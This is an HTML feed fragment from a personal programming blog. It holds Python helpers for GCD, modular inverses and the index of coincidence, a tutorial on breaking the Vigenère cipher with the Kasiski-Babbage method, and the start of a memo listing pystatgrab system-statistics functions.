</span><span class='line'>          <span class="n">l</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">l</span>
</span></code></pre></td></tr></table></div></figure>


<h3>PGCD with Bezout Factors</h3>

<p>For two numbers given in parameter the function return the PGCD and the two Bezout factors (u and v).</p>

<figure class='code'><figcaption><span>PGCD computation</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">def</span> <span class="nf">pgcduv</span><span class="p">(</span><span class="n">num</span><span class="p">,</span><span class="n">divisor</span><span class="p">):</span>
</span><span class='line'>  <span class="n">u</span> <span class="o">=</span> <span class="mi">1</span>
</span><span class='line'>  <span class="n">v</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'>  <span class="n">s</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'>  <span class="n">t</span> <span class="o">=</span> <span class="mi">1</span>
</span><span class='line'>  <span class="k">while</span> <span class="p">(</span><span class="n">divisor</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">):</span>
</span><span class='line'>      <span class="n">rest</span> <span class="o">=</span> <span class="n">num</span> <span class="o">%</span> <span class="n">divisor</span>
</span><span class='line'>      <span class="n">quo</span> <span class="o">=</span> <span class="n">num</span> <span class="o">/</span> <span class="n">divisor</span>
</span><span class='line'>      <span class="c">#print &quot;%s = %s * %s + %s&quot; % (num, quo, divisor, rest)</span>
</span><span class='line'>      <span class="c"># a = q * b + r</span>
</span><span class='line'>      <span class="n">num</span> <span class="o">=</span> <span class="n">divisor</span>
</span><span class='line'>      <span class="n">divisor</span> <span class="o">=</span> <span class="n">rest</span>
</span><span class='line'>      
</span><span class='line'>      <span class="n">tmp</span> <span class="o">=</span> <span class="n">s</span>
</span><span class='line'>      <span class="n">s</span> <span class="o">=</span> <span class="n">u</span> <span class="o">-</span> <span class="n">quo</span> <span class="o">*</span> <span class="n">s</span>
</span><span class='line'>      <span class="n">u</span> <span class="o">=</span> <span class="n">tmp</span>
</span><span class='line'>      
</span><span class='line'>      <span class="n">tmp</span> <span class="o">=</span> <span class="n">t</span>
</span><span class='line'>      <span class="n">t</span> <span class="o">=</span> <span class="n">v</span> <span class="o">-</span> <span class="n">quo</span> <span class="o">*</span> <span class="n">t</span>
</span><span class='line'>      <span class="n">v</span> <span class="o">=</span> <span class="n">tmp</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">num</span><span class="p">,</span> <span class="n">u</span><span class="p">,</span> <span class="n">v</span>
</span></code></pre></td></tr></table></div></figure>


<h3>Can be inversed</h3>

<p>Return true or false if the number given in parameter can be inversed (use the pgcd function above).</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">def</span> <span class="nf">inverse_possible</span><span class="p">(</span><span class="n">modulo</span><span class="p">,</span> <span class="n">num</span><span class="p">):</span>
</span><span class='line'>  <span class="k">if</span> <span class="n">pgcd</span><span class="p">(</span><span class="n">modulo</span><span class="p">,</span> <span class="n">num</span><span class="p">,</span> <span class="n">num</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
</span><span class='line'>      <span class="k">return</span> <span class="bp">True</span>
</span><span class='line'>  <span class="k">else</span><span class="p">:</span>
</span><span class='line'>      <span class="k">return</span> <span class="bp">False</span>
</span></code></pre></td></tr></table></div></figure>


<h3>Calculate inverse</h3>

<p>Return the inverse of a number with the given modulo.</p>

<figure class='code'><figcaption><span>compute inverse</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">def</span> <span class="nf">inverse</span><span class="p">(</span><span class="n">num</span><span class="p">,</span> <span class="n">mod</span><span class="p">):</span>
</span><span class='line'>  <span class="n">inv</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'>  <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">mod</span><span class="p">):</span>
</span><span class='line'>      <span class="n">j</span> <span class="o">=</span> <span class="o">-</span> <span class="n">mod</span>
</span><span class='line'>      <span class="k">while</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">:</span>
</span><span class='line'>          <span class="k">if</span> <span class="p">(</span><span class="n">mod</span><span class="o">*</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="p">(</span><span class="n">num</span><span class="o">*</span><span class="n">j</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
</span><span class='line'>              <span class="n">inv</span> <span class="o">=</span> <span class="n">j</span>
</span><span class='line'>          <span class="n">j</span> <span class="o">=</span> <span class="n">j</span> <span class="o">+</span> <span class="mi">1</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">inv</span><span class="o">+</span><span class="n">mod</span>
</span></code></pre></td></tr></table></div></figure>


<h3>Coincidence index</h3>

<p>Take in argument the list returned by countFreq, and the total size of the list and return de index of coincidence.</p>

<figure class='code'><figcaption><span>compute coincidence index</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">def</span> <span class="nf">cI</span><span class="p">(</span><span class="n">occ</span><span class="p">,</span><span class="n">n</span><span class="p">):</span>
</span><span class='line'>    <span class="n">somme</span> <span class="o">=</span> <span class="n">Decimal</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span><span class='line'>    <span class="n">tmp</span> <span class="o">=</span> <span class="n">Decimal</span><span class="p">(</span><span class="n">n</span><span class="o">*</span><span class="p">(</span><span class="n">n</span><span class="o">-</span><span class="mi">1</span><span class="p">))</span>
</span><span class='line'>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">occ</span><span class="p">:</span>
</span><span class='line'>        <span class="n">somme</span> <span class="o">=</span> <span class="n">somme</span> <span class="o">+</span> <span class="p">(</span> <span class="n">Decimal</span><span class="p">(</span><span class="n">i</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">*</span><span class="p">(</span><span class="n">i</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">-</span><span class="mi">1</span><span class="p">))</span> <span class="o">/</span> <span class="n">tmp</span> <span class="p">)</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">somme</span>
</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Kasiski-Babbage cryptanalysis in Python]]></title>
    <link href="http://www.robindavid.fr/blog/2012/06/15/kasiski-babbage-cryptanalysis-in-python/"/>
    <updated>2012-06-15T00:00:00+00:00</updated>
    <id>http://www.robindavid.fr/blog/2012/06/15/kasiski-babbage-cryptanalysis-in-python</id>
    <content type="html"><![CDATA[<p>This article will show you how to decrypt text ciphered with Vigenere algorithm wihtout knowing neither the key neither the key length.</p>

<h2> Principle</h2>

<p>The Kasiski-Babbagge method is based on the fact that once we have found the key length found the clear text is reduced to find the clear text of a ceaser ciphered text (which is really easy).</p>

<p>Another principle of the method is that 3 or more characters at two different position in the ciphered text are most likely to have been ciphered with the same 3 or more characters of the key. Based on this fact the distance between the two suite of characters is very likely to be a multiple of the key length. Example:</p>

<p><img class="center" src="http://www.robindavid.fr/images/matrix.png" title="'matrix'" ></p>

<p>As we can see on the picture above there is 3 patterns with a respective distance of 70, 40 and 10. So we can easily suppose that the key length is a multiple of the three distance. In this case the greatest multiple is 10, we can suppose that key is 10 characters long.</p>

<p>In this case we just have to split the text in 10, every ten characters to create 10 samples in which the frequency of characters can be analysed like in caesar.</p>

<h2>Code !</h2>

<p>The input file used for this example can be downloaded <a href="http://www.robindavid.fr/downloads/kasiski-input.txt" title="">here</a></p>

<p>The following use various helping functions showed in <a href="">useful-basic-function-python</a></p>

<p>Now the key part of the cryptanalysis is to develop the algorithm to find all the tuples  throughout the text calculate theirs distance and the divisors of it.
So the firt function to write is a function that calculate all the divisors of a value. The function below do the job and for the given integer return a list of all the divisors.</p>

<figure class='code'><figcaption><span>Get all the divisors of a given number</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">def</span> <span class="nf">getDivisors</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
</span><span class='line'>    <span class="n">l</span> <span class="o">=</span> <span class="p">[]</span>
</span><span class='line'>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="n">n</span><span class="p">):</span>
</span><span class='line'>        <span class="k">if</span> <span class="n">n</span> <span class="o">%</span> <span class="n">i</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span><span class='line'>            <span class="n">l</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">l</span>
</span></code></pre></td></tr></table></div></figure>


<p>Now let&rsquo;s move to the core function that find all the tuples. This function return two values that are the number of tuples found and a dirty list of the divisors of all tuples. (You will see later how it will be used).</p>

<figure class='code'><figcaption><span>Find identical patterns in list (size > 3)</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#l argument should be a list containing all bytes of the file (read with toList)</span>
</span><span class='line'><span class="k">def</span> <span class="nf">getTuples</span><span class="p">(</span><span class="n">l</span><span class="p">):</span>
</span><span class='line'>    <span class="n">res</span> <span class="o">=</span> <span class="p">{}</span>
</span><span class='line'>    <span class="n">freq</span> <span class="o">=</span><span class="p">[]</span>
</span><span class='line'>    <span class="n">count</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'>    <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'>    <span class="k">while</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">l</span><span class="p">):</span> <span class="c"># Loop through all the list</span>
</span><span class='line'>        <span class="n">elt</span><span class="o">=</span> <span class="n">l</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">3</span><span class="p">]</span> <span class="c"># Take at least 3-character length for tuples</span>
</span><span class='line'>        <span class="nb">long</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">elt</span><span class="p">)</span>
</span><span class='line'>        <span class="k">if</span> <span class="nb">long</span> <span class="o">==</span> <span class="mi">3</span><span class="p">:</span> <span class="c">#should be 3 if not means we are at the end of the list</span>
</span><span class='line'>            <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">l</span><span class="p">)):</span> <span class="c">#Find further in the list for the same pattern</span>
</span><span class='line'>                <span class="k">if</span> <span class="n">l</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="nb">long</span><span class="p">]</span> <span class="o">==</span> <span class="n">l</span><span class="p">[</span><span class="n">j</span><span class="p">:</span><span class="n">j</span><span class="o">+</span><span class="nb">long</span><span class="p">]:</span> <span class="c">#If match the 3-char check for more</span>
</span><span class='line'>                    <span class="k">while</span> <span class="n">l</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="nb">long</span><span class="p">]</span> <span class="o">==</span> <span class="n">l</span><span class="p">[</span><span class="n">j</span><span class="p">:</span><span class="n">j</span><span class="o">+</span><span class="nb">long</span><span class="p">]:</span>
</span><span class='line'>                        <span class="nb">long</span> <span class="o">=</span> <span class="nb">long</span> <span class="o">+</span> <span class="mi">1</span>
</span><span class='line'>                    <span class="nb">long</span> <span class="o">=</span> <span class="nb">long</span> <span class="o">-</span><span class="mi">1</span>
</span><span class='line'>                    <span class="n">elt</span> <span class="o">=</span> <span class="n">l</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="nb">long</span><span class="p">]</span> <span class="c"># Now we have a tuple </span>
</span><span class='line'>                    <span class="n">diff</span> <span class="o">=</span> <span class="n">j</span> <span class="o">-</span> <span class="n">i</span> <span class="c"># Compute the distance</span>
</span><span class='line'>                    <span class="n">freq</span><span class="o">.</span><span class="n">extend</span><span class="p">(</span><span class="n">getDivisors</span><span class="p">(</span><span class="n">diff</span><span class="p">))</span> <span class="c">#Add the divisors to the list </span>
</span><span class='line'>                    <span class="k">print</span> <span class="p">(</span><span class="s">&quot;</span><span class="si">%s</span><span class="se">\t</span><span class="s">i:</span><span class="si">%s</span><span class="se">\t</span><span class="s">j:</span><span class="si">%s</span><span class="se">\t</span><span class="s">diff:</span><span class="si">%s</span><span class="se">\t\t</span><span class="s">Divisors:</span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">elt</span><span class="p">,</span><span class="n">i</span><span class="p">,</span><span class="n">j</span><span class="p">,</span> <span class="n">diff</span><span class="p">,</span><span class="n">getDivisors</span><span class="p">(</span><span class="n">diff</span><span class="p">)))</span> <span class="c">#Print information about the tuple (can be deleted)</span>
</span><span class='line'>                    <span class="n">count</span> <span class="o">=</span> <span class="n">count</span> <span class="o">+</span><span class="mi">1</span>
</span><span class='line'>                    <span class="n">j</span> <span class="o">=</span> <span class="n">j</span> <span class="o">+</span> <span class="nb">long</span> <span class="o">+</span> <span class="mi">1</span>
</span><span class='line'>            <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="nb">long</span> <span class="o">-</span><span class="mi">3</span> <span class="o">+</span><span class="mi">1</span>
</span><span class='line'>        <span class="k">else</span><span class="p">:</span>
</span><span class='line'>            <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">count</span><span class="p">,</span> <span class="n">freq</span>
</span></code></pre></td></tr></table></div></figure>


<p>The next step is to make the count each divisors and sort them in descending order. The following function return a list sorted containing a tupe of the divisor number and the number of hits.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">def</span> <span class="nf">countOcc</span><span class="p">(</span><span class="n">l</span><span class="p">):</span> <span class="c"># return list with (decimal_char, occ) </span>
</span><span class='line'>    <span class="n">d</span><span class="o">=</span><span class="p">{}</span>
</span><span class='line'>    <span class="k">for</span> <span class="n">elt</span> <span class="ow">in</span> <span class="n">l</span><span class="p">:</span>
</span><span class='line'>        <span class="k">if</span> <span class="n">d</span><span class="o">.</span><span class="n">has_key</span><span class="p">(</span><span class="n">elt</span><span class="p">):</span>
</span><span class='line'>            <span class="n">d</span><span class="p">[</span><span class="n">elt</span><span class="p">]</span> <span class="o">+=</span> <span class="mi">1</span>
</span><span class='line'>        <span class="k">else</span><span class="p">:</span>
</span><span class='line'>            <span class="n">d</span><span class="p">[</span><span class="n">elt</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span>
</span><span class='line'>    <span class="k">return</span> <span class="nb">sorted</span><span class="p">(</span><span class="n">d</span><span class="o">.</span><span class="n">items</span><span class="p">(),</span><span class="n">key</span><span class="o">=</span><span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="n">x</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">reverse</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>The list returned by this function is:
<strong>[(2, 143), (5, 142), (10, 138), (4, 72), (20, 69), (6, 42), (3, 42), (15, 41), (8, 39), (30, 39), (40, 36), (7, 29), (14, 29), (35, 29), (25, 28), (50, 24), (70, 24), (12, 20), (60, 20)]</strong></p>

<p>In this example we can see that 2 is a divisor for 138 tuple etc. But there is also 5 and 10 that are close and 4 is far behind. Moreover 2 and 5 are also divisors of 10 so this is obvious that the key is 10 characters long.</p>

<p>Now that we &ldquo;know&rdquo; the key length we just have to split the ciphered list into 10 sub-lists modulo 10. The function below return take in argument the key length and the original list and return a dictionnary that use the position as key (ex: 1 to 10) and all the sub-lists as items.</p>

<figure class='code'><figcaption><span>Split file in sublist of 10 chars</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">def</span> <span class="nf">explode</span><span class="p">(</span><span class="n">key</span><span class="p">,</span><span class="n">li</span><span class="p">):</span>
</span><span class='line'>    <span class="n">dic</span> <span class="o">=</span> <span class="p">{}</span>
</span><span class='line'>    <span class="k">for</span> <span class="n">e</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">key</span><span class="o">+</span><span class="mi">1</span><span class="p">):</span>
</span><span class='line'>        <span class="n">dic</span><span class="p">[</span><span class="n">e</span><span class="p">]</span> <span class="o">=</span> <span class="p">[]</span>
</span><span class='line'>    <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'>    <span class="k">for</span> <span class="n">index</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">li</span><span class="p">)):</span>
</span><span class='line'>        <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="n">key</span><span class="p">:</span>
</span><span class='line'>            <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'>        <span class="n">dic</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">li</span><span class="p">[</span><span class="n">index</span><span class="p">])</span>
</span><span class='line'>        <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">dic</span>
</span></code></pre></td></tr></table></div></figure>


<p>The next step is the second delicate step. Indeed we need to find the shift for each sub-list. To find it we can do a frequency analysis considering the space as the most frequent character like it used to be in english. So what we will do here is do a frequency analysis for each sub-list. For each sub-list we consider the most frequent character as a space and then apply the associated shift to all character. And then we recreate the original list with all decipher sub-list and then recreate the text. Once it&rsquo;s done we can easily identify if for one of the sub-list the space was not the most frequent and then we can try with the second most frequent and so on.
The first function we need to acomplish this task is a function that decipher a list with a given shift:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">def</span> <span class="nf">decipher</span><span class="p">(</span><span class="n">l</span><span class="p">,</span><span class="n">diff</span><span class="p">):</span>
</span><span class='line'>    <span class="n">newl</span> <span class="o">=</span> <span class="nb">list</span><span class="p">()</span>
</span><span class='line'>    <span class="k">for</span> <span class="n">e</span> <span class="ow">in</span> <span class="n">l</span><span class="p">:</span>
</span><span class='line'>        <span class="n">val</span> <span class="o">=</span> <span class="n">e</span> <span class="o">-</span> <span class="n">diff</span>
</span><span class='line'>        <span class="k">if</span> <span class="n">val</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">:</span>
</span><span class='line'>            <span class="n">newl</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="mi">256</span> <span class="o">+</span> <span class="p">(</span><span class="n">val</span> <span class="o">%</span> <span class="o">-</span><span class="mi">256</span><span class="p">))</span>
</span><span class='line'>        <span class="k">else</span><span class="p">:</span>
</span><span class='line'>            <span class="n">newl</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">val</span><span class="p">)</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">newl</span>
</span></code></pre></td></tr></table></div></figure>


<p>Now we need a function that do the reverse of the explode function. So this function takes back the dictionnary returned by explode and recreate the list.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">def</span> <span class="nf">recreate</span><span class="p">(</span><span class="n">dic</span><span class="p">):</span>
</span><span class='line'>    <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'>    <span class="n">output</span> <span class="o">=</span> <span class="p">[]</span>
</span><span class='line'>    <span class="k">try</span><span class="p">:</span>
</span><span class='line'>        <span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
</span><span class='line'>            <span class="k">for</span> <span class="n">l</span> <span class="ow">in</span> <span class="n">dic</span><span class="o">.</span><span class="n">values</span><span class="p">():</span>
</span><span class='line'>                <span class="n">output</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">l</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
</span><span class='line'>            <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span>
</span><span class='line'>    <span class="k">except</span><span class="p">:</span>
</span><span class='line'>        <span class="k">pass</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">output</span>
</span></code></pre></td></tr></table></div></figure>


<p>To finish the following piece of code explode the original list, makes a frequency analysis decipher all the sub-list, then recreate the list and end up by reconverting every decimal character into character in order to print the result.</p>

<figure class='code'><figcaption><span>final code to trigger the all</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">res</span> <span class="o">=</span> <span class="n">explode</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span> <span class="n">l</span><span class="p">)</span> <span class="c">#We consider in this exemple a key length of 10 and l the original list</span>
</span><span class='line'><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">10</span><span class="o">+</span><span class="mi">1</span><span class="p">):</span> <span class="c">#For each sub-list</span>
</span><span class='line'>    <span class="n">occ</span> <span class="o">=</span> <span class="n">countOcc</span><span class="p">(</span><span class="n">res</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="c">#Make a frequency analysis</span>
</span><span class='line'>    <span class="n">shift</span> <span class="o">=</span> <span class="p">(</span><span class="n">occ</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">-</span> <span class="mi">32</span><span class="p">)</span> <span class="o">%</span> <span class="mi">256</span> <span class="c"># Consider the most frequent element of being a space(32 in decimal)</span>
</span><span class='line'>    <span class="k">print</span> <span class="p">(</span><span class="s">&quot;Frequency analysis for the index: </span><span class="si">%s</span><span class="se">\t</span><span class="s">shift:</span><span class="si">%s</span><span class="se">\n</span><span class="si">%s</span><span class="se">\n</span><span class="s">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="n">shift</span><span class="p">,</span><span class="n">occ</span><span class="p">))</span> <span class="c">#Print informations (can be deleted)</span>
</span><span class='line'>    <span class="n">res</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">decipher</span><span class="p">(</span><span class="n">res</span><span class="p">[</span><span class="n">i</span><span class="p">],</span><span class="n">shift</span><span class="p">)</span> <span class="c">#Try do decipher using a classical ceaser function and the determined shift</span>
</span><span class='line'>
</span><span class='line'><span class="n">final</span> <span class="o">=</span> <span class="n">recreate</span><span class="p">(</span><span class="n">res</span><span class="p">)</span> <span class="c">#Once we have processed all sub-list recreate a list with all the sub-lists.</span>
</span><span class='line'><span class="k">print</span> <span class="s">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="nb">chr</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">final</span><span class="p">])</span> <span class="c">#Print the result</span>
</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[pystatgrab Memo]]></title>
    <link href="http://www.robindavid.fr/blog/2012/04/23/pystatgrab-memo/"/>
    <updated>2012-04-23T00:00:00+00:00</updated>
    <id>http://www.robindavid.fr/blog/2012/04/23/pystatgrab-memo</id>
    <content type="html"><![CDATA[<p>Pystatgrab is the python binding for the libstatgrab that allow to get statistical informations about you system like cpu load, filesystem io, network io etc..</p>

<p>It works only for linux, that why I recommend you to take a look at <a href="http://code.google.com/p/psutil/">psutil</a> which works on both Linux, Windows and OSX but also provides a lot more functionalities.</p>

<p>Anyway if you are interesed in a small and efficient statistics tools keep reading this article.</p>

<h3>All the available functions are</h3>

<ul>
<li><strong>sg_get_cpu_percents()</strong> Give information about CPU load in percents</li>
<li><strong>sg_get_cpu_stats()</strong> Same than cpu_percents but give also the timestamp</li>
<li><strong>sg_get_cpu_stats_diff()</strong> Return the difference in values with the previous cpu_percents/stats</li>
<li><strong>sg_get_disk_io_stats()</strong> Give in bytes input ouput of each disks</li>
<li><strong>sg_get_disk_io_stats_diff()</strong> Give the difference with the previous io_stats</li>
<li><strong>sg_get_error()</strong></li>
<li><strong>sg_get_error_arg()</strong></li>
<li><strong>sg_get_error_errno()</strong></li>
<li><strong>sg_get_fs_stats()</strong> Return infos about filesystem (bugged), free_blocks, total ..</li>
<li><strong>sg_get_host_info()</strong> Return basically the same than uname -a</li>
<li><strong>sg_get_load_stats()</strong> Return the average since 1 minute, 5 minutes and 15 minutes</li>
<li><strong>sg_get_mem_stats()</strong> Return total, free, cache and used of the RAM</li>
<li><strong>sg_get_network_iface_stats()</strong> Return network interfaces and theirs status</li>
<li><strong>sg_get_network_io_stats()</strong> Return input ouput in bytes on each interfaces (and errors..)</li>
<li><strong>sg_get_network_io_stats_diff()</strong> Return the difference with the last io_stats()</li>
<li><strong>sg_get_page_stats()</strong></li>
<li><strong>sg_get_page_stats_diff()</strong></li>
<li><strong>sg_get_process_count()</strong> Return informations about processes</li>
<li><strong>sg_get_process_stats()</strong> Return informations about all process</li>
<li><strong>sg_get_swap_stats()</strong> Same as mem_stats but not with cache</li>
<li><strong>sg_get_user_stats()</strong></li>
</ul>


<figure class='code'><figcaption><span>Example </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
